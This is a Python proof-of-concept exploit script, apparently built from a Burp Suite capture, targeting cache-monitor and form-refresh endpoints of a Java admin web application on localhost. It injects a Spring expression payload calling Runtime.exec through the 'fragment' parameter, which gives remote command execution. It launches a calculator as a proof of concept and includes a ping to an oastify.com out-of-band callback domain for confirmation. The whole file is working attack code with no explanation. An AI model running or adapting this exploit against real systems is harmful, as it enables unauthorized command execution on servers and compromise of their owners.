import requests


burp0_headers = {"sec-ch-ua-platform": "\"Windows\"", "Accept-Language": "zh-CN,zh;q=0.9",
                 "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"", "sec-ch-ua-mobile": "?0",
                 "X-Requested-With": "XMLHttpRequest",
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
                 "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                 "Origin": "http://127.0.0.1:4710", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors",
                 "Sec-Fetch-Dest": "empty", "Referer": "http://127.0.0.1:4710/monitor/cache",
                 "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}

burp0_cookies = {"JSESSIONID": "9671fe0e-7917-47c3-817e-2354c5ea0548"}
base_url = "http://127.0.0.1:4500"
# 键自定义，值为exec中的内容
cmds = {"calc": "calc", "dns": "ping 123.6szitn1khian20r7aike2u8tzk5bt1hq.oastify.com"}
for key in cmds.keys():
    cmds[key] = "${T (java.lang.Runtime).getRuntime().exec(\"" + cmds[key] + "\")}"

def getKeys(exp):
    burp0_url = f"{base_url}/monitor/cache/getKeys"
    burp0_data = {"cacheName": "123", "fragment": f"{exp}"}
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

def getNames(exp):
    burp0_url = f"{base_url}/monitor/cache/getNames"
    burp0_data = {"cacheName": "123", "fragment": f"{exp}"}
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

def getValue(exp):
    burp0_url = f"{base_url}/monitor/cache/getValue"
    burp0_data = {"cacheName": "123", "fragment": f"{exp}"}
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

def refresh(exp):
    burp0_url = f"{base_url}/demo/form/localrefresh/task"
    burp0_data = {"taskName": "123", "fragment": f"{exp}"}
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)


if __name__ == "__main__":
    refresh(cmds["calc"])